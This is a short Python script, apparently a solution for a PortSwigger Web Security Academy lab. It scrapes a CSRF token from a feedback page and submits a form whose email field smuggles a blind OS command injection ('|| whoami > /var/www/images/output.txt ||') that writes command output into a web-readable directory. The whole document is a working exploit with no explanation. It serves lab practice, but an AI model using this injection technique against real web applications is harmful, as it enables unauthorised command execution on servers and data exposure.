import requests
from bs4 import BeautifulSoup

site = 'ace51fce1e297617c09314ae0034009a.web-security-academy.net'
url = f'''https://{site}'''
post_url = f'''{url}/feedback/submit'''


s = requests.Session()
feedback_url = f'{url}/feedback'
resp = s.get(feedback_url)
soup = BeautifulSoup(resp.text,'html.parser')
csrf = soup.find('input', {'name':'csrf'}).get('value')

feedback_submit_url = post_url
post_data = {
    'csrf' : csrf,
    'name' : 'Name',
    'email' : 's@gmail.com || whoami > /var/www/images/output.txt ||',
    'subject' : 'test',
    'message' : 'hello'
}
resp = s.post(feedback_submit_url, data=post_data)
print(resp.text)